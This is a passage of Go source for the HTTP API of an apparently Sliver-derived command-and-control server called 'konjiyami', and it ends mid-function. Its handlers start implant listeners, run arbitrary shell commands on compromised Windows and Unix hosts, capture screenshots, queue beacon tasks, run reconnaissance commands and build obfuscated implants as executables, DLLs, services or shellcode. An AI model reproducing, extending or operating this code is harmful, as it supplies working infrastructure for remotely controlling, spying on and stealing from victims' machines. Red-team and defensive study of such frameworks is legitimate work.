package api

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	consts "konjiyami/client/constants"
	"konjiyami/protobuf/clientpb"
	"konjiyami/protobuf/commonpb"
	"konjiyami/protobuf/konjiyamipb"
	"konjiyami/server/assets"
	"konjiyami/server/c2"
	"konjiyami/server/codenames"
	"konjiyami/server/configs"
	"konjiyami/server/core"
	"konjiyami/server/cryptography"
	"konjiyami/server/db"
	"konjiyami/server/db/models"
	"konjiyami/server/generate"

	"github.com/gofrs/uuid"
	"github.com/gorilla/mux"
	"google.golang.org/protobuf/proto"
)

// --- DTOs ---

type listenerDTO struct {
	ID          int      `json:"id"`
	Name        string   `json:"name"`
	Description string   `json:"description"`
	Protocol    string   `json:"protocol"`
	Port        int      `json:"port"`
	Domains     []string `json:"domains,omitempty"`
}

type sessionDTO struct {
	ID            string `json:"id"`
	Name          string `json:"name"`
	Hostname      string `json:"hostname"`
	Username      string `json:"username"`
	OS            string `json:"os"`
	Arch          string `json:"arch"`
	Transport     string `json:"transport"`
	RemoteAddress string `json:"remoteAddress"`
	PID           int32  `json:"pid"`
	Filename      string `json:"filename"`
	LastCheckin   string `json:"lastCheckin"`
	IsDead        bool   `json:"isDead"`
	Health        string `json:"health"`
}

type beaconDTO struct {
	ID        string `json:"id"`
	Name      string `json:"name"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	Transport string `json:"transport"`
	// Interval/Jitter in seconds at the API boundary (nanoseconds internally)
	Interval  int64 `json:"interval"`
	Jitter    int64 `json:"jitter"`
	NextCheck int64 `json:"nextCheckin"`
	LastCheck int64 `json:"lastCheckin"`
}

// --- Paginated response envelopes ---

type paginatedListeners struct {
	Items  []listenerDTO `json:"items"`
	Total  int           `json:"total"`
	Limit  int           `json:"limit"`
	Offset int           `json:"offset"`
}

type paginatedSessions struct {
	Items  []sessionDTO `json:"items"`
	Total  int          `json:"total"`
	Limit  int          `json:"limit"`
	Offset int          `json:"offset"`
}

type paginatedBeacons struct {
	Items  []beaconDTO `json:"items"`
	Total  int         `json:"total"`
	Limit  int         `json:"limit"`
	Offset int         `json:"offset"`
}

// --- DTO helpers ---

func sessionToDTO(s *core.Session) sessionDTO {
	dto := sessionDTO{
		ID:       s.ID,
		Name:     s.Name,
		Hostname: s.Hostname,
		Username: s.Username,
		OS:       s.OS,
		Arch:     s.Arch,
		PID:      s.PID,
		Filename: s.Filename,
	}
	if s.ActiveC2 != "" {
		dto.Transport = s.ActiveC2
	}
	if s.Connection != nil {
		dto.RemoteAddress = s.Connection.RemoteAddress
		last := s.Connection.GetLastMessage()
		if !last.IsZero() {
			dto.LastCheckin = last.Format(time.RFC3339)
		}
	}
	if s.IsDead() {
		dto.IsDead = true
		dto.Health = "DEAD"
	} else {
		dto.Health = "ALIVE"
	}
	return dto
}

func beaconToDTO(b *models.Beacon) beaconDTO {
	return beaconDTO{
		ID:        b.ID.String(),
		Name:      b.Name,
		Hostname:  b.Hostname,
		Username:  b.Username,
		OS:        b.OS,
		Arch:      b.Arch,
		Transport: b.ActiveC2,
		// Divide by time.Second to expose seconds at the API boundary
		Interval:  b.Interval / int64(time.Second),
		Jitter:    b.Jitter / int64(time.Second),
		NextCheck: b.NextCheckin,
		LastCheck: b.LastCheckin.Unix(),
	}
}

func jobToDTO(j *core.Job) listenerDTO {
	return listenerDTO{
		ID:          j.ID,
		Name:        j.Name,
		Description: j.Description,
		Protocol:    j.Protocol,
		Port:        int(j.Port),
		Domains:     j.Domains,
	}
}

// --- Pagination helper ---

func parsePagination(r *http.Request) (limit, offset int) {
	limit = 100
	offset = 0
	if v, err := strconv.Atoi(r.URL.Query().Get("limit")); err == nil && v > 0 && v <= 500 {
		limit = v
	}
	if v, err := strconv.Atoi(r.URL.Query().Get("offset")); err == nil && v >= 0 {
		offset = v
	}
	return limit, offset
}

func applySlice[T any](s []T, limit, offset int) []T {
	total := len(s)
	if offset >= total {
		return []T{}
	}
	end := offset + limit
	if end > total {
		end = total
	}
	return s[offset:end]
}

// --- System handlers ---

func handleHealth(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}

func handleVersion(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]string{"version": "0.2.0-dev"})
}

// --- Status (A1: enriched with full entity arrays) ---

type enrichedStatusDTO struct {
	Version       string        `json:"version"`
	Sessions      []sessionDTO  `json:"sessions"`
	Beacons       []beaconDTO   `json:"beacons"`
	Listeners     []listenerDTO `json:"listeners"`
	Jobs          []listenerDTO `json:"jobs"`
	Logs          []string      `json:"logs"`
	Username      string        `json:"username"`
	ListenerCount int           `json:"listenerCount"`
	SessionCount  int           `json:"sessionCount"`
	BeaconCount   int           `json:"beaconCount"`
	PayloadCount  int           `json:"payloadCount"`
	LastUpdatedUTC string       `json:"lastUpdatedUTC"`
}

func (s *HTTPServer) handleStatus(w http.ResponseWriter, r *http.Request) {
	sessions := core.Sessions.All()
	beacons, _ := db.ListBeacons()
	jobs := core.Jobs.All()

	sessionDTOs := make([]sessionDTO, 0, len(sessions))
	for _, sess := range sessions {
		sessionDTOs = append(sessionDTOs, sessionToDTO(sess))
	}

	beaconDTOs := make([]beaconDTO, 0, len(beacons))
	for _, b := range beacons {
		beaconDTOs = append(beaconDTOs, beaconToDTO(b))
	}

	listenerDTOs := make([]listenerDTO, 0, len(jobs))
	for _, j := range jobs {
		listenerDTOs = append(listenerDTOs, jobToDTO(j))
	}

	username := "operator"
	if claims := getClaims(r); claims != nil {
		username = claims.Username
	}

	resp := enrichedStatusDTO{
		Version:       "0.2.0-dev",
		Sessions:      sessionDTOs,
		Beacons:       beaconDTOs,
		Listeners:     listenerDTOs,
		Jobs:          listenerDTOs,
		Logs:          []string{},
		Username:      username,
		ListenerCount: len(jobs),
		SessionCount:  len(sessions),
		BeaconCount:   len(beacons),
		PayloadCount:  len(s.payloads.list()),
		LastUpdatedUTC: time.Now().UTC().Format(time.RFC3339),
	}
	writeJSON(w, http.StatusOK, resp)
}

// --- Listener handlers ---

func handleListListeners(w http.ResponseWriter, r *http.Request) {
	limit, offset := parsePagination(r)
	jobs := core.Jobs.All()
	all := make([]listenerDTO, 0, len(jobs))
	for _, j := range jobs {
		all = append(all, jobToDTO(j))
	}
	page := applySlice(all, limit, offset)
	writeJSON(w, http.StatusOK, paginatedListeners{Items: page, Total: len(all), Limit: limit, Offset: offset})
}

// createListener is the shared implementation for both POST /listeners and POST /listeners/{kind}.
func createListener(w http.ResponseWriter, r *http.Request, kindOverride string) {
	var req struct {
		Protocol string `json:"protocol"`
		Host     string `json:"host"`
		Port     uint16 `json:"port"`
		Domain   string `json:"domain"`
		Secure   bool   `json:"secure"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	if kindOverride != "" {
		req.Protocol = kindOverride
	}
	if req.Port > 65534 {
		writeError(w, http.StatusBadRequest, "invalid port")
		return
	}
	if req.Host == "" {
		req.Host = "0.0.0.0"
	}

	var job *core.Job
	var err error

	switch req.Protocol {
	case "mtls":
		if req.Port == 0 {
			req.Port = 4444
		}
		job, err = c2.StartMTLSListenerJob(req.Host, req.Port)

	case "http":
		if req.Port == 0 {
			req.Port = 80
		}
		conf := &c2.HTTPServerConfig{
			Addr:   fmt.Sprintf("%s:%d", req.Host, req.Port),
			LPort:  req.Port,
			Domain: req.Domain,
			Secure: false,
		}
		job, err = c2.StartHTTPListenerJob(conf)

	case "https":
		if req.Port == 0 {
			req.Port = 443
		}
		conf := &c2.HTTPServerConfig{
			Addr:   fmt.Sprintf("%s:%d", req.Host, req.Port),
			LPort:  req.Port,
			Domain: req.Domain,
			Secure: true,
		}
		job, err = c2.StartHTTPListenerJob(conf)

	case "dns":
		writeError(w, http.StatusBadRequest, "DNS listener is not supported in this version. Planned for v0.4.")
		return

	case "wg":
		if req.Port == 0 {
			req.Port = 53
		}
		job, err = c2.StartWGListenerJob(req.Port, 8888, 1337)

	default:
		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported protocol: %s", req.Protocol))
		return
	}

	if err != nil {
		apiLog.Errorf("StartListener(%s): %v", req.Protocol, err)
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}

	writeJSON(w, http.StatusCreated, jobToDTO(job))
}

func handleCreateListener(w http.ResponseWriter, r *http.Request) {
	createListener(w, r, "")
}

// handleCreateListenerByKind is the /listeners/{kind} alias (A6).
func handleCreateListenerByKind(w http.ResponseWriter, r *http.Request) {
	kind := mux.Vars(r)["kind"]
	createListener(w, r, kind)
}

func handleKillListener(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	id, err := strconv.Atoi(idStr)
	if err != nil {
		writeError(w, http.StatusBadRequest, "invalid job id")
		return
	}
	job := core.Jobs.Get(id)
	if job == nil {
		writeError(w, http.StatusNotFound, "job not found")
		return
	}
	if job.PersistentID != "" {
		configs.GetServerConfig().RemoveJob(job.PersistentID)
	}
	core.Jobs.Remove(job)
	if job.JobCtrl != nil {
		job.JobCtrl <- true
	}
	writeJSON(w, http.StatusOK, map[string]string{"status": "killed"})
}

// --- Session handlers ---

func handleListSessions(w http.ResponseWriter, r *http.Request) {
	limit, offset := parsePagination(r)
	sessions := core.Sessions.All()
	all := make([]sessionDTO, 0, len(sessions))
	for _, s := range sessions {
		all = append(all, sessionToDTO(s))
	}
	page := applySlice(all, limit, offset)
	writeJSON(w, http.StatusOK, paginatedSessions{Items: page, Total: len(all), Limit: limit, Offset: offset})
}

func handleKillSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	session := core.Sessions.Get(sessionID)
	if session == nil {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	core.Sessions.Remove(sessionID)
	writeJSON(w, http.StatusOK, map[string]string{"status": "killed"})
}

func handleRenameSession(w http.ResponseWriter, r *http.Request) {
	sessionID := mux.Vars(r)["id"]
	session := core.Sessions.Get(sessionID)
	if session == nil {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	var req struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	req.Name = strings.TrimSpace(req.Name)
	if req.Name == "" {
		writeError(w, http.StatusBadRequest, "name cannot be empty")
		return
	}
	session.Name = req.Name
	core.Sessions.UpdateSession(session)
	writeJSON(w, http.StatusOK, sessionToDTO(session))
}

func handleRenameBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	var req struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	req.Name = strings.TrimSpace(req.Name)
	if req.Name == "" {
		writeError(w, http.StatusBadRequest, "name cannot be empty")
		return
	}
	beacon.Name = req.Name
	if err := db.Session().Save(beacon).Error; err != nil {
		apiLog.Errorf("rename beacon %s: %v", id, err)
		writeError(w, http.StatusInternalServerError, "failed to rename beacon")
		return
	}
	core.EventBroker.Publish(core.Event{
		EventType: "beacon-renamed",
		Beacon:    beacon,
	})
	writeJSON(w, http.StatusOK, beaconToDTO(beacon))
}

// takeScreenshot sends the screenshot RPC, saves the PNG to the artifacts
// directory, and returns the URL path to serve it.
func takeScreenshot(session *core.Session) (string, error) {
	const screenTimeout = 30 * time.Second
	screenReq := &konjiyamipb.ScreenshotReq{
		Request: &commonpb.Request{Timeout: int64(screenTimeout)},
	}
	reqData, err := proto.Marshal(screenReq)
	if err != nil {
		return "", fmt.Errorf("failed to build request: %w", err)
	}
	session.Connection.UpdateLastMessage()
	respData, err := session.Request(konjiyamipb.MsgNumber(screenReq), screenTimeout, reqData)
	if err != nil {
		return "", err
	}
	var resp konjiyamipb.Screenshot
	if err := proto.Unmarshal(respData, &resp); err != nil {
		return "", fmt.Errorf("failed to parse response: %w", err)
	}
	if len(resp.Data) == 0 {
		return "", fmt.Errorf("empty screenshot data")
	}
	screenshotDir := filepath.Join(assets.GetRootAppDir(), "artifacts", "screenshots")
	os.MkdirAll(screenshotDir, 0o755)
	fname := fmt.Sprintf("screenshot_%d.png", time.Now().UnixMilli())
	if err := os.WriteFile(filepath.Join(screenshotDir, fname), resp.Data, 0o644); err != nil {
		return "", fmt.Errorf("failed to save screenshot: %w", err)
	}
	return "/api/v1/artifacts/screenshots/" + fname, nil
}

// sessionAlive checks that a session exists and its connection is responsive.
// Returns the session or writes an error and returns nil.
func sessionAlive(w http.ResponseWriter, sessionID string) *core.Session {
	session := core.Sessions.Get(sessionID)
	if session == nil {
		writeError(w, http.StatusNotFound, "session not found")
		return nil
	}
	if session.IsDead() {
		writeError(w, http.StatusGone, "session is dead — implant disconnected")
		return nil
	}
	return session
}

// requestWithTimeout wraps session.Request with a hard wall-clock deadline.
// session.Request has two internal selects (send + receive) each using its own
// copy of the timeout, so the real worst-case is 2×timeout.  This wrapper
// ensures the HTTP handler never blocks longer than `hardLimit`.
func requestWithTimeout(session *core.Session, msgType uint32, rpcTimeout, hardLimit time.Duration, data []byte) ([]byte, error) {
	type result struct {
		data []byte
		err  error
	}
	ch := make(chan result, 1)
	t0 := time.Now()
	go func() {
		d, e := session.Request(msgType, rpcTimeout, data)
		ch <- result{d, e}
	}()
	select {
	case r := <-ch:
		return r.data, r.err
	case <-time.After(hardLimit):
		apiLog.Warnf("[timeout] hard limit %s exceeded (elapsed %s)", hardLimit, time.Since(t0))
		return nil, core.ErrImplantTimeout
	}
}

// handleSessionConsole executes a shell command in a live session (A3).
func handleSessionConsole(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}

	var body struct {
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Command) == "" {
		writeError(w, http.StatusBadRequest, "command is required")
		return
	}

	// Intercept commands that need special handling.
	cmdLower := strings.ToLower(strings.TrimSpace(body.Command))
	switch cmdLower {
	case "screenshot":
		url, err := takeScreenshot(session)
		if err != nil {
			writeError(w, http.StatusRequestTimeout, err.Error())
			return
		}
		writeJSON(w, http.StatusOK, map[string]any{"output": url})
		return
	case "pwd":
		if strings.EqualFold(session.OS, "windows") {
			body.Command = "cd"
		}
	}

	const rpcTimeout = 30 * time.Second
	const hardLimit = 35 * time.Second
	exeReq := &konjiyamipb.ExecuteReq{
		Output:  true,
		Request: &commonpb.Request{Timeout: int64(rpcTimeout)},
	}
	if strings.EqualFold(session.OS, "windows") {
		exeReq.Path = "cmd.exe"
		exeReq.Args = []string{"/C", body.Command}
	} else {
		exeReq.Path = "sh"
		exeReq.Args = []string{"-c", body.Command}
	}

	reqData, err := proto.Marshal(exeReq)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}

	apiLog.Infof("[console] session=%s cmd=%q path=%s args=%v", session.ID, body.Command, exeReq.Path, exeReq.Args)
	session.Connection.UpdateLastMessage()
	respData, err := requestWithTimeout(session, konjiyamipb.MsgNumber(exeReq), rpcTimeout, hardLimit, reqData)
	if err != nil {
		apiLog.Errorf("[console] session=%s cmd=%q error: %v", session.ID, body.Command, err)
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	apiLog.Infof("[console] session=%s cmd=%q response received, %d bytes", session.ID, body.Command, len(respData))

	var resp konjiyamipb.Execute
	if err := proto.Unmarshal(respData, &resp); err != nil {
		apiLog.Errorf("[console] session=%s cmd=%q unmarshal failed: %v (raw %d bytes)", session.ID, body.Command, err, len(respData))
		writeError(w, http.StatusInternalServerError, "failed to parse response")
		return
	}

	apiLog.Infof("[console] session=%s cmd=%q status=%d stdout=%d stderr=%d",
		session.ID, body.Command, resp.Status, len(resp.Stdout), len(resp.Stderr))
	output := string(resp.Stdout)
	if len(resp.Stderr) > 0 {
		output += "\n" + string(resp.Stderr)
	}
	writeJSON(w, http.StatusOK, map[string]any{"output": output, "status": resp.Status})
}

// quickActions maps action IDs to shell commands per OS.
var quickActions = map[string][2]string{
	// [windows cmd, unix cmd]
	"ps":      {"tasklist /FO TABLE", "ps aux"},
	"whoami":  {"whoami /all", "id"},
	"getuid":  {"whoami /all", "id"},
	"netstat": {"netstat -ano", "netstat -tulpn 2>/dev/null || ss -tulpn"},
	"ifconfig": {"ipconfig /all", "ip a 2>/dev/null || ifconfig"},
}

// handleSessionActions dispatches a named quick action to a live session (A4).
func handleSessionActions(w http.ResponseWriter, r *http.Request) {
	sessionID := mux.Vars(r)["id"]

	var body struct {
		Action string         `json:"action"`
		Args   map[string]any `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON")
		return
	}
	action := strings.ToLower(strings.TrimSpace(body.Action))
	if action == "" {
		writeError(w, http.StatusBadRequest, "action is required")
		return
	}

	// Kill doesn't need a live connection — just remove from the map.
	if action == "kill" {
		if core.Sessions.Get(sessionID) == nil {
			writeError(w, http.StatusNotFound, "session not found")
			return
		}
		core.Sessions.Remove(sessionID)
		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "action": "kill", "output": "session terminated"})
		return
	}

	session := sessionAlive(w, sessionID)
	if session == nil {
		return
	}

	switch action {
	case "screenshot":
		url, err := takeScreenshot(session)
		if err != nil {
			writeError(w, http.StatusRequestTimeout, err.Error())
			return
		}
		writeJSON(w, http.StatusOK, map[string]any{
			"ok":     true,
			"action": "screenshot",
			"output": url,
		})
		return

	default:
		cmds, ok := quickActions[action]
		if !ok {
			writeError(w, http.StatusBadRequest, "unknown action: "+action)
			return
		}
		var cmd string
		if strings.EqualFold(session.OS, "windows") {
			cmd = cmds[0]
		} else {
			cmd = cmds[1]
		}
		const rpcTimeout = 2 * time.Minute
		const hardLimit = 130 * time.Second
		exeReq := &konjiyamipb.ExecuteReq{
			Output:  true,
			Request: &commonpb.Request{Timeout: int64(rpcTimeout)},
		}
		if strings.EqualFold(session.OS, "windows") {
			exeReq.Path = "cmd.exe"
			exeReq.Args = []string{"/C", cmd}
		} else {
			exeReq.Path = "sh"
			exeReq.Args = []string{"-c", cmd}
		}
		reqData, err := proto.Marshal(exeReq)
		if err != nil {
			writeError(w, http.StatusInternalServerError, "failed to build request")
			return
		}
		session.Connection.UpdateLastMessage()
		respData, err := requestWithTimeout(session, konjiyamipb.MsgNumber(exeReq), rpcTimeout, hardLimit, reqData)
		if err != nil {
			writeError(w, http.StatusRequestTimeout, err.Error())
			return
		}
		var execResp konjiyamipb.Execute
		if err := proto.Unmarshal(respData, &execResp); err != nil {
			writeError(w, http.StatusInternalServerError, "failed to parse response")
			return
		}
		output := string(execResp.Stdout)
		if len(execResp.Stderr) > 0 {
			output += "\n" + string(execResp.Stderr)
		}
		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "action": action, "output": output})
	}
}

// --- Beacon handlers ---

func handleListBeacons(w http.ResponseWriter, r *http.Request) {
	limit, offset := parsePagination(r)
	beacons, err := db.ListBeacons()
	if err != nil {
		apiLog.Errorf("ListBeacons: %v", err)
		writeError(w, http.StatusInternalServerError, "failed to list beacons")
		return
	}
	all := make([]beaconDTO, 0, len(beacons))
	for _, b := range beacons {
		all = append(all, beaconToDTO(b))
	}
	page := applySlice(all, limit, offset)
	writeJSON(w, http.StatusOK, paginatedBeacons{Items: page, Total: len(all), Limit: limit, Offset: offset})
}

// handleKillBeacon deletes a beacon and all its tasks from the database (A2).
func handleKillBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	if err := db.Session().Where(&models.BeaconTask{BeaconID: beacon.ID}).Delete(&models.BeaconTask{}).Error; err != nil {
		apiLog.Errorf("delete beacon tasks %s: %v", id, err)
		writeError(w, http.StatusInternalServerError, "failed to delete beacon tasks")
		return
	}
	if err := db.Session().Delete(beacon).Error; err != nil {
		apiLog.Errorf("delete beacon %s: %v", id, err)
		writeError(w, http.StatusInternalServerError, "failed to delete beacon")
		return
	}
	core.AddToBeaconKillList(id)
	apiLog.Infof("beacon %s added to kill list", id)
	writeJSON(w, http.StatusOK, map[string]string{"status": "killed"})
}

// --- Beacon task handlers ---

type beaconTaskDTO struct {
	ID          string `json:"id"`
	BeaconID    string `json:"beaconId"`
	Command     string `json:"command"`
	State       string `json:"state"`
	CreatedAt   int64  `json:"createdAt"`
	SentAt      int64  `json:"sentAt,omitempty"`
	CompletedAt int64  `json:"completedAt,omitempty"`
	Output      string `json:"output,omitempty"`
}

func beaconTaskToDTO(t *models.BeaconTask, includeOutput bool) beaconTaskDTO {
	dto := beaconTaskDTO{
		ID:        t.ID.String(),
		BeaconID:  t.BeaconID.String(),
		Command:   t.Description,
		State:     t.State,
		CreatedAt: t.CreatedAt.Unix(),
	}
	if !t.SentAt.IsZero() {
		dto.SentAt = t.SentAt.Unix()
	}
	if !t.CompletedAt.IsZero() {
		dto.CompletedAt = t.CompletedAt.Unix()
	}
	if includeOutput && t.State == models.COMPLETED && len(t.Response) > 0 {
		dto.Output = parseBeaconTaskOutput(t.Response)
	}
	return dto
}

func handleListBeaconTasks(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	tasks, err := db.BeaconTasksByBeaconID(beacon.ID.String())
	if err != nil {
		apiLog.Errorf("list beacon tasks %s: %v", id, err)
		writeError(w, http.StatusInternalServerError, "failed to list tasks")
		return
	}
	dtos := make([]beaconTaskDTO, 0, len(tasks))
	for _, t := range tasks {
		dtos = append(dtos, beaconTaskToDTO(t, true))
	}
	writeJSON(w, http.StatusOK, map[string]any{"tasks": dtos})
}

func handleCreateBeaconTask(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}

	var body struct {
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Command) == "" {
		writeError(w, http.StatusBadRequest, "command is required")
		return
	}

	isWin := strings.EqualFold(beacon.OS, "windows")
	exeReq := &konjiyamipb.ExecuteReq{
		Output:  true,
		Request: &commonpb.Request{},
	}
	if isWin {
		exeReq.Path = "cmd.exe"
		exeReq.Args = []string{"/C", body.Command}
	} else {
		exeReq.Path = "sh"
		exeReq.Args = []string{"-c", body.Command}
	}
	reqData, err := proto.Marshal(exeReq)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}

	task, err := beacon.Task(&konjiyamipb.Envelope{
		Type: konjiyamipb.MsgNumber(exeReq),
		Data: reqData,
	})
	if err != nil {
		apiLog.Errorf("create beacon task: %v", err)
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = body.Command

	if err := db.Session().Save(task).Error; err != nil {
		apiLog.Errorf("save beacon task: %v", err)
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}

	apiLog.Infof("[beacon-task] beacon=%s cmd=%q taskID=%s", beacon.ID, body.Command, task.ID)
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

func handleCancelBeaconTask(w http.ResponseWriter, r *http.Request) {
	beaconID := mux.Vars(r)["id"]
	taskID := mux.Vars(r)["taskId"]

	_, err := db.BeaconByID(beaconID)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}

	taskUUID := uuid.FromStringOrNil(taskID)
	if taskUUID == uuid.Nil {
		writeError(w, http.StatusBadRequest, "invalid task ID")
		return
	}

	result := db.Session().Model(&models.BeaconTask{}).
		Where("id = ? AND beacon_id = ? AND state IN ?", taskUUID.String(), uuid.FromStringOrNil(beaconID).String(), []string{models.PENDING, models.SENT}).
		Updates(map[string]interface{}{
			"state":        models.CANCELED,
			"completed_at": time.Now(),
		})
	if result.Error != nil {
		writeError(w, http.StatusInternalServerError, "failed to cancel task")
		return
	}
	if result.RowsAffected == 0 {
		writeError(w, http.StatusNotFound, "task not found or already completed")
		return
	}
	apiLog.Infof("[beacon-task] canceled task=%s beacon=%s", taskID, beaconID)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "canceled": taskID})
}

// --- Implant generation handlers ---

func implantExtension(goos, format string) string {
	switch strings.ToLower(format) {
	case "exe", "executable":
		switch strings.ToLower(goos) {
		case "windows":
			return ".exe"
		default:
			return ""
		}
	case "dll":
		return ".dll"
	case "shared":
		switch strings.ToLower(goos) {
		case "windows":
			return ".dll"
		case "darwin":
			return ".dylib"
		default:
			return ".so"
		}
	case "shellcode":
		return ".bin"
	case "service":
		return ".exe"
	default:
		if strings.ToLower(goos) == "windows" {
			return ".exe"
		}
		return ""
	}
}

func formatLabel(goos string, f clientpb.OutputFormat) string {
	switch f {
	case clientpb.OutputFormat_EXECUTABLE:
		switch strings.ToLower(goos) {
		case "linux":
			return "elf"
		case "darwin":
			return "macho"
		default:
			return "exe"
		}
	case clientpb.OutputFormat_SHARED_LIB:
		switch strings.ToLower(goos) {
		case "darwin":
			return "dylib"
		case "linux":
			return "so"
		default:
			return "dll"
		}
	case clientpb.OutputFormat_SHELLCODE:
		return "shellcode"
	case clientpb.OutputFormat_SERVICE:
		return "service"
	default:
		return "exe"
	}
}

// buildImplant compiles an implant from the request and returns the file path and binary data.
func buildImplant(name, goos, goarch, format, c2url string, isBeacon, debug bool, beaconInterval, beaconJitter int64) (string, []byte, error) {
	pbConfig := &clientpb.ImplantConfig{
		GOOS:                goos,
		GOARCH:              goarch,
		Name:                name,
		ObfuscateSymbols:    true,
		Format:              parseOutputFormat(format),
		IsBeacon:            isBeacon,
		BeaconInterval:      beaconInterval * int64(time.Second),
		BeaconJitter:        beaconJitter * int64(time.Second),
		Debug:               debug,
		MaxConnectionErrors: 1000,
		ReconnectInterval:   int64(60 * time.Second),
	}
	if c2url != "" {
		pbConfig.C2 = []*clientpb.ImplantC2{{Priority: 0, URL: c2url}}
	}

	implantName, config := generate.ImplantConfigFromProtobuf(pbConfig)
	if implantName == "" {
		for attempt := 0; attempt < 10; attempt++ {
			candidate, err := codenames.GetCodename()
			if err != nil {
				return "", nil, fmt.Errorf("codename: %w", err)
			}
			if _, err := db.ImplantBuildByName(candidate); err != nil {
				implantName = candidate
				break
			}
		}
		if implantName == "" {
			implantName = fmt.Sprintf("IMPLANT_%d", time.Now().UnixMilli())
		}
	} else if old, err := db.ImplantBuildByName(implantName); err == nil {
		generate.ImplantFileDelete(old)
		deleteImplantBuildFromDB(old)
	}
	if config.TemplateName == "" {
		config.TemplateName = generate.KONJIYAMITemplateName
	}

	otpSecret, _ := cryptography.TOTPServerSecret()
	if err := generate.GenerateConfig(implantName, config, true); err != nil {
		return "", nil, fmt.Errorf("GenerateConfig: %w", err)
	}

	var fPath string
	var err error

	if pbConfig.Format == clientpb.OutputFormat_SHARED_LIB {
		if _, lookErr := exec.LookPath("gcc"); lookErr != nil {
			return "", nil, fmt.Errorf("Shared library generation requires CGO and a C compiler (gcc/MinGW). Install MinGW-w64 and ensure gcc is in your PATH")
		}
	}

	switch pbConfig.Format {
	case clientpb.OutputFormat_SERVICE:
		fallthrough
	case clientpb.OutputFormat_EXECUTABLE:
		fPath, err = generate.KONJIYAMIExecutable(implantName, otpSecret, config, true)
	case clientpb.OutputFormat_SHARED_LIB:
		fPath, err = generate.KONJIYAMISharedLibrary(implantName, otpSecret, config, true)
	case clientpb.OutputFormat_SHELLCODE:
		fPath, err = generate.KONJIYAMIShellcode(implantName, otpSecret, config, true)
	default:
		return "", nil, fmt.Errorf("invalid format: %s", format)
	}
	if err != nil {
		return "", nil, fmt.Errorf("generate: %w", err)
	}

	data, err := os.ReadFile(fPath)
	if err != nil {
		return "", nil, fmt.Errorf("read file: %w", err)
	}
	return fPath, data, nil
}

// handleGenerateImplant streams the binary OR returns JSON metadata (A5).
// If the request has Accept: application/json, returns {id, name, size}.
// Otherwise streams application/octet-stream.
func handleGenerateImplant(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name           string `json:"name"`
		OS             string `json:"os"`
		Arch           string `json:"arch"`
		Format         string `json:"format"`
		C2             string `json:"listener"`
		IsBeacon       bool   `json:"isBeacon"`
		Debug          bool   `json:"debug"`
		BeaconInterval int64  `json:"beaconInterval"`
		BeaconJitter   int64  `json:"beaconJitter"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	if req.OS == "" {
		req.OS = "windows"
	}
	if req.Arch == "" {
		req.Arch = "amd64"
	}
	if req.Format == "" {
		req.Format = "exe"
	}

	fPath, fileData, err := buildImplant(req.Name, req.OS, req.Arch, req.Format, req.C2, req.IsBeacon, req.Debug, req.BeaconInterval, req.BeaconJitter)
	if err != nil {
		apiLog.Errorf("Generate implant: %v", err)
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}

	fileName := filepath.Base(fPath)
	core.EventBroker.Publish(core.Event{
		EventType: consts.BuildCompletedEvent,
		Data:      []byte(fileName),
	})

	// A5: JSON response mode when Accept: application/json
	if strings.Contains(r.Header.Get("Accept"), "application/json") {
		writeJSON(w, http.StatusOK, map[string]any{
			"id":   fileName,
			"name": fileName,
			"size": int64(len(fileData)),
		})
